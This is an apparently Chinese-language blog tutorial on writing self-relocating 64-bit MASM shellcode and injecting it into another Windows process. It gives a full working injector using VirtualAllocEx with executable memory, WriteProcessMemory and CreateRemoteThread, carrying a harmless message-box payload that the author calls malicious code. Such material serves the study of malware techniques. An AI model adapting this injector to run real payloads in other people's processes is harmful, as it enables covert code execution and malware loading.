---
title: 编写具有自我重定位功能的64位代码并注入其他进程
date: 2021-01-24 17:34:50
tags: [Windows,重定位,进程注入]
categories: Windows
toc: true
---

进程注入的一种实现方法是将恶意代码直接复制到目标进程的内存空间，并通过CreateRemoteThread在目标进程中执行这段恶意代码。这个方法的一个难点在于，恶意代码复制到目标进程的内存空间后，它的基地址可能会发生变化。假如说恶意代码需要对自身某个特定地址的数据进行访问，就会访问不到这个数据，因为数据的地址已经改变了。为了解决这一问题，需要进行重定位的操作。

<!--more-->

一种重定位的方法是：在注入恶意代码之前，对代码内容进行预处理，根据实际申请到的目标进程内存首地址，修正恶意代码中实际地址与预期地址的差异。这一过程可以借助重定位表来完成，重定位表中包含一个数组，记录了代码中需要重定位的数据的相对虚拟地址RVA。

另一种方式就是恶意代码自身进行重定位，比如下面这段代码：

```x86asm
	call	reloc
reloc:
	pop	rbx
	mov	rax, offset reloc
	sub	rbx, rax
```

这段代码执行完毕后，rbx寄存器中就保存了真实地址和预期地址的差值。接下来，假设想要获得变量`Variable`的真实地址，则可以执行这段代码：

```x86asm
	mov	rax, offset Variable
	add	rbx, rax
```

执行完毕后，rbx中就包含变量`Variable`的真实地址了。

## 编写具有自我重定位功能的64位汇编代码

### 获得64位汇编代码

首先选择一个64位汇编的编译器。本文选用的是Visual Studio提供的ml64.exe。[MASM for x64 (ml64.exe)](https://docs.microsoft.com/en-us/cpp/assembler/masm/masm-for-x64-ml64-exe?view=msvc-160)

如果对ml64.exe不太熟悉，可以先编写C语言代码，然后再使用Visual Studio的命令行工具将C语言文件转换成汇编语言文件。

要想使用Visual Studio的命令行工具，可以先运行VsDevCmd.bat批处理文件，然后就能直接使用各种命令行工具，而不用输入路径名了。VsDevCmd.bat通常位于`Program Files (x86)\Microsoft Visual Studio\2019\BuildTools\Common7\Tools`文件夹下。

首先编写一个无限弹窗C语言代码：

```c
#include <windows.h>
#pragma comment(lib, "user32.lib")

int main() {
    while(1) {
        MessageBoxA(NULL, "Injected", "A Window", MB_ICONSTOP | MB_OK);
    }
}
```

保存到shellcode.c文件中。接下来，使用Visual Studio的命令行工具cl.exe编译：

```
> vsdevcmd -arch=amd64
**********************************************************************
** Visual Studio 2019 Developer Command Prompt v16.8.4
** Copyright (c) 2020 Microsoft Corporation
**********************************************************************

> cl /FA shellcode.c
用于 x64 的 Microsoft (R) C/C++ 优化编译器 19.28.29336 版
版权所有(C) Microsoft Corporation。保留所有权利。

shellcode.c
Microsoft (R) Incremental Linker Version 14.28.29336.0
Copyright (C) Microsoft Corporation.  All rights reserved.

/out:shellcode.exe
shellcode.obj
```

选项/FA就可以让其产生汇编代码文件shellcode.asm。不过这个时候shellcode.asm内容比较复杂，编译得到的shellcode.exe也比较大（大约90KB）。如果可以简化shellcode.asm，并适当缩小shellcode.exe的体积将会更有利于后续分析。

对shellcode.asm进行修改，得到：

```x86asm
INCLUDELIB user32.lib
EXTRN	__imp_MessageBoxA:PROC

_TEXT	SEGMENT
main	PROC
; Line 4
	sub	rsp, 40					; 00000028H
	jmp	$LN2@main
	Caption DB	'MessageBox', 00H
	Text DB	'Injected', 00H
$LN2@main:
; Line 6
	mov	r9d, 16
	mov	r8, offset Caption
	mov	rdx, offset Text
	xor	ecx, ecx
	call	QWORD PTR __imp_MessageBoxA
; Line 7
	jmp	SHORT $LN2@main
main	ENDP
_TEXT	ENDS
END
```

删掉了一些不必要的INCLUDE语句，仅保留一个INCLUDELIB，并删去一些不需要的节，如pdata和xdata。此外，还将数据节中的数据转移到代码节，并将数据节给删掉了。

> 其实我还改了一个地方，就是将第14行和第15行的lea指令修改成mov指令。如果是lea指令，则这里使用的是相对寻址，不需要进行重定位的操作。为了说明重定位的原理，将其修改为mov指令，从而让这里使用绝对寻址。

使用ml64.exe将修改后的shellcode.asm编译链接成可执行文件shellcode.exe：

```
> ml64 shellcode.asm /link /ENTRY:main
Microsoft (R) Macro Assembler (x64) Version 14.28.29336.0
Copyright (C) Microsoft Corporation.  All rights reserved.

 Assembling: shellcode.asm
Microsoft (R) Incremental Linker Version 14.28.29336.0
Copyright (C) Microsoft Corporation.  All rights reserved.

/OUT:shellcode.exe
shellcode.obj
/ENTRY:main
```

shellcode.exe的体积缩小到了仅有大约3KB。

### 添加自我重定位功能

在shellcode.asm中，调用MessageBoxA前会进行一系列传参操作。其中，传入Caption和Text的地址使用的是绝对地址。代码注入其他进程后，这个地址可能会发生改变，因此需要进行重定位操作。

```
.text:000000014000101A 41 B9 10 00 00 00                             mov     r9d, 10h        ; uType
.text:0000000140001020 49 B8 06 10 00 40 01 00 00 00                 mov     r8, offset Caption ; "MessageBox"
.text:000000014000102A 48 BA 11 10 00 40 01 00 00 00                 mov     rdx, offset Text ; "Injected"
.text:0000000140001034 33 C9                                         xor     ecx, ecx        ; hWnd
.text:0000000140001036 FF 15 C4 0F 00 00                             call    cs:MessageBoxA
```

添加重定位操作后的代码为：

```x86asm
INCLUDELIB user32.lib
EXTRN	__imp_MessageBoxA:PROC

_TEXT	SEGMENT
main	PROC
	sub	rsp, 40					; 00000028H
	call	reloc
reloc:
	pop	rbx
	mov	rax, offset reloc
	sub	rbx, rax
	mov	rax, offset Caption
	add	rbx, rax
	jmp	$LN2@main
	Caption DB	'MessageBox', 00H
	Text DB	'Injected', 00H
$LN2@main:
; Line 6
	mov	r9d, 16
	mov	r8, rbx
	lea	rdx, [rbx + 11]
	xor	ecx, ecx
	call	QWORD PTR __imp_MessageBoxA
; Line 7
	jmp	SHORT $LN2@main
main	ENDP
_TEXT	ENDS
END
```

rbx寄存器保存的就是Caption的真实地址，Caption的长度为11，因此Text的地址就为rbx+11。

### 用LoadLibraryA和GetProcAddress代替MessageBoxA

MessageBoxA是user32.dll提供的一个函数。但是，并不是所有进程都会加载user32.dll，对于那些没有加载user32.dll的进程，注入的代码是无法正常运行的。不过，几乎所有进程都会加载kernel32.dll，而kernel32.dll中又包含LoadLibraryA和GetProcAddress，可以利用它们加载user32.dll并获取MessageBoxA的地址。

```x86asm
INCLUDELIB kernel32.lib
EXTRN	__imp_GetProcAddress:PROC
EXTRN	__imp_LoadLibraryA:PROC

_TEXT	SEGMENT
main	PROC
	sub	rsp, 40					; 00000028H
	;通过重定位让rbx指向Caption首地址
	call	reloc
reloc:
	pop	rbx
	mov	rax, offset reloc
	sub	rbx, rax
	mov	rax, offset Caption
	add	rbx, rax
	;调用LoadLibraryA和GetProcAddress获得MessageBoxA
	lea	rcx, [rbx + 20]
	call	QWORD PTR __imp_LoadLibraryA
	lea	rdx, [rbx + 31]
	mov rcx, rax
	call	QWORD PTR __imp_GetProcAddress
	mov	r12, rax
	jmp	$LN2@main
	Caption DB	'MessageBox', 00H	;[rbx]
	Text DB	'Injected', 00H			;[rbx + 11]
	LibName	DB	'user32.dll', 00H	;[rbx + 20]
	FuncName	DB	'MessageBoxA', 00H	;[rbx + 31]
$LN2@main:
; Line 6
	mov	r9d, 16
	mov	r8, rbx
	lea	rdx, [rbx + 11]
	xor	rcx, rcx
	call	r12
; Line 7
	jmp	SHORT $LN2@main
main	ENDP
_TEXT	ENDS
END
```

### 处理调用系统API的语句

现在的代码中有两个调用系统API的语句：

```x86asm
	call	QWORD PTR __imp_LoadLibraryA
	call	QWORD PTR __imp_GetProcAddress
```

将代码注入目标进程后，这两条语句就有可能不奏效了，因此把这两条语句处理一下。首先找到LoadLibraryA和GetProcAddress的地址，可以写一个很简单的C语言程序来找：

```c
#include <windows.h>
#include <stdio.h>

int main() {
    void *p1 = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
    void *p2 = GetProcAddress(GetModuleHandle("kernel32.dll"), "GetProcAddress");
    printf("LoadLibraryA Address: %p\n", p1);
    printf("GetProcAddress Address: %p\n", p2);
    return 0;
}
```

在我当前的电脑上，运行结果为：

```
LoadLibraryA Address: 00007FFFC185EBB0
GetProcAddress Address: 00007FFFC185A360
```

因此，对这两条语句作如下修改：

```x86asm
	mov	rax, 00007FFFC185EBB0H	;LoadLibraryA入口地址
	call	rax
	
	mov	rax, 00007FFFC185A360H	;GetProcAddress入口地址
	call	rax
```

这里用到了一个性质，就是对于一台电脑上运行的多个进程，系统API的虚拟地址通常是相等的。不过我希望这个代码还能在其他机器上运行，所以这里的`00007FFFC185EBB0H`和`00007FFFC185A360H`只是临时的，在注入其他进程之前还会被修改。

### 最终得到的代码

```x86asm
_TEXT	SEGMENT
main	PROC
	sub	rsp, 40					; 00000028H
	;通过重定位让rbx指向Caption首地址
	call	reloc
reloc:
	pop	rbx
	mov	rax, offset reloc
	sub	rbx, rax
	mov	rax, offset Caption
	add	rbx, rax
	;调用LoadLibraryA和GetProcAddress获得MessageBoxA
	lea	rcx, [rbx + 20]
	mov	rax, 00007FFFC185EBB0H	;LoadLibraryA入口地址
	call	rax
	lea	rdx, [rbx + 31]
	mov rcx, rax
	mov	rax, 00007FFFC185A360H	;GetProcAddress入口地址
	call	rax
	mov	r12, rax
	jmp	$LN2@main
	Caption DB	'MessageBox', 00H	;[rbx]
	Text DB	'Injected', 00H			;[rbx + 11]
	LibName	DB	'user32.dll', 00H	;[rbx + 20]
	FuncName	DB	'MessageBoxA', 00H	;[rbx + 31]
$LN2@main:
; Line 6
	mov	r9d, 16
	mov	r8, rbx
	lea	rdx, [rbx + 11]
	xor	rcx, rcx
	call	r12
; Line 7
	jmp	SHORT $LN2@main
main	ENDP
_TEXT	ENDS
END
```

使用ml64.exe生成可执行文件：

```
> ml64 shellcode.asm /link /ENTRY:main
Microsoft (R) Macro Assembler (x64) Version 14.28.29336.0
Copyright (C) Microsoft Corporation.  All rights reserved.

 Assembling: shellcode.asm
Microsoft (R) Incremental Linker Version 14.28.29336.0
Copyright (C) Microsoft Corporation.  All rights reserved.

/OUT:shellcode.exe
shellcode.obj
/ENTRY:main
```

然后，再将shellcode.exe拖入IDA Pro中，并将代码部分拖黑，再选择Edit->Export Data，将其导出为C语言数组形式：

```c
unsigned char ida_chars[] =
{//  0     1     2     3     4     5     6     7     8     9
  0x48, 0x83, 0xEC, 0x28, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x5B,   //0 
  0x48, 0xB8, 0x09, 0x10, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00,   //1
  0x48, 0x2B, 0xD8, 0x48, 0xB8, 0x4C, 0x10, 0x00, 0x40, 0x01,   //2
  0x00, 0x00, 0x00, 0x48, 0x03, 0xD8, 0x48, 0x8D, 0x4B, 0x14,   //3
  0x48, 0xB8, 0xB0, 0xEB, 0x85, 0xC1, 0xFF, 0x7F, 0x00, 0x00,   //4
  0xFF, 0xD0, 0x48, 0x8D, 0x53, 0x1F, 0x48, 0x8B, 0xC8, 0x48,   //5
  0xB8, 0x60, 0xA3, 0x85, 0xC1, 0xFF, 0x7F, 0x00, 0x00, 0xFF,   //6
  0xD0, 0x4C, 0x8B, 0xE0, 0xEB, 0x2B, 0x4D, 0x65, 0x73, 0x73,   //7
  0x61, 0x67, 0x65, 0x42, 0x6F, 0x78, 0x00, 0x49, 0x6E, 0x6A,   //8
  0x65, 0x63, 0x74, 0x65, 0x64, 0x00, 0x75, 0x73, 0x65, 0x72,   //9
  0x33, 0x32, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x4D, 0x65, 0x73,   //10
  0x73, 0x61, 0x67, 0x65, 0x42, 0x6F, 0x78, 0x41, 0x00, 0x41,   //11
  0xB9, 0x10, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0xC3, 0x48, 0x8D,   //12
  0x53, 0x0B, 0x48, 0x33, 0xC9, 0x41, 0xFF, 0xD4, 0xEB, 0xEB    //13
};
```

## 编写进程注入程序

获得了C语言数组形式的代码后，接下来要做的就是将代码注入到目标进程的内存空间中，然后在目标进程中执行这段代码了。不过在这之前，先要处理一下LoadLibraryA和GetProcAddress的地址。

之前的代码假定LoadLibraryA和GetProcAddress的地址分别为`00007FFFC185EBB0H`和`00007FFFC185A360H`，而这并不总是成立的。所以，先将这两个数值替换为LoadLibraryA和GetProcAddress的实际地址：

```c
    //获取LoadLibraryA和GetProcAddress的真实地址
    void *p1 = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
    void *p2 = GetProcAddress(GetModuleHandle("kernel32.dll"), "GetProcAddress");
    //ida_chars[]中LoadLibraryA位于ida_chars[42]，GetProcAddress位于ida_chars[61]
    *(uint64_t *)(&ida_chars[42]) = (uint64_t)p1;
    *(uint64_t *)(&ida_chars[61]) = (uint64_t)p2;
```

然后，就可以将数组ida_chars的内容写到目标进程的内存空间，并CreateRemoteThread开启远程线程执行这段代码了：

```c
    //将ida_chars[]写入目标进程内存空间
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, atoi(argv[1]));
    if(NULL == hProcess) {
        printf("OpenProcess Failed: %d\n", GetLastError());
        return -1;
    }
    void *mem = VirtualAllocEx(hProcess, NULL, sizeof(ida_chars), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if(NULL == mem) {
        printf("VirtualAllocEx Failed: %d\n", GetLastError());
        return -1;
    }
    BOOL result = WriteProcessMemory(hProcess, mem, ida_chars, sizeof(ida_chars), NULL);
    if(!result) {
        printf("WriteProcessMemory Failed: %d\n", GetLastError());
        return -1;
    }
    //创建远程线程执行ida_chars[]中的代码
    HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, mem, NULL, 0, NULL);
    if(NULL == hRemoteThread) {
        printf("CreateRemoteThread Failed: %d\n", GetLastError());
        return -1;
    }
    printf("Injected!\n");
    return 0;
```

### 完整代码

```c
#include <windows.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

unsigned char ida_chars[] =
{//  0     1     2     3     4     5     6     7     8     9
  0x48, 0x83, 0xEC, 0x28, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x5B,   //0 
  0x48, 0xB8, 0x09, 0x10, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00,   //1
  0x48, 0x2B, 0xD8, 0x48, 0xB8, 0x4C, 0x10, 0x00, 0x40, 0x01,   //2
  0x00, 0x00, 0x00, 0x48, 0x03, 0xD8, 0x48, 0x8D, 0x4B, 0x14,   //3
  0x48, 0xB8, 0xB0, 0xEB, 0x85, 0xC1, 0xFF, 0x7F, 0x00, 0x00,   //4
  0xFF, 0xD0, 0x48, 0x8D, 0x53, 0x1F, 0x48, 0x8B, 0xC8, 0x48,   //5
  0xB8, 0x60, 0xA3, 0x85, 0xC1, 0xFF, 0x7F, 0x00, 0x00, 0xFF,   //6
  0xD0, 0x4C, 0x8B, 0xE0, 0xEB, 0x2B, 0x4D, 0x65, 0x73, 0x73,   //7
  0x61, 0x67, 0x65, 0x42, 0x6F, 0x78, 0x00, 0x49, 0x6E, 0x6A,   //8
  0x65, 0x63, 0x74, 0x65, 0x64, 0x00, 0x75, 0x73, 0x65, 0x72,   //9
  0x33, 0x32, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x4D, 0x65, 0x73,   //10
  0x73, 0x61, 0x67, 0x65, 0x42, 0x6F, 0x78, 0x41, 0x00, 0x41,   //11
  0xB9, 0x10, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0xC3, 0x48, 0x8D,   //12
  0x53, 0x0B, 0x48, 0x33, 0xC9, 0x41, 0xFF, 0xD4, 0xEB, 0xEB    //13
};

int main(int argc, char **argv) {
    if(argc < 2) {
        printf("Usage: inject [pid]\n");
        return -1;
    }
    //获取LoadLibraryA和GetProcAddress的真实地址
    void *p1 = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
    void *p2 = GetProcAddress(GetModuleHandle("kernel32.dll"), "GetProcAddress");
    //ida_chars[]中LoadLibraryA位于ida_chars[42]，GetProcAddress位于ida_chars[61]
    *(uint64_t *)(&ida_chars[42]) = (uint64_t)p1;
    *(uint64_t *)(&ida_chars[61]) = (uint64_t)p2;
    //将ida_chars[]写入目标进程内存空间
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, atoi(argv[1]));
    if(NULL == hProcess) {
        printf("OpenProcess Failed: %d\n", GetLastError());
        return -1;
    }
    void *mem = VirtualAllocEx(hProcess, NULL, sizeof(ida_chars), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if(NULL == mem) {
        printf("VirtualAllocEx Failed: %d\n", GetLastError());
        return -1;
    }
    BOOL result = WriteProcessMemory(hProcess, mem, ida_chars, sizeof(ida_chars), NULL);
    if(!result) {
        printf("WriteProcessMemory Failed: %d\n", GetLastError());
        return -1;
    }
    //创建远程线程执行ida_chars[]中的代码
    HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, mem, NULL, 0, NULL);
    if(NULL == hRemoteThread) {
        printf("CreateRemoteThread Failed: %d\n", GetLastError());
        return -1;
    }
    printf("Injected!\n");
    return 0;
}
```

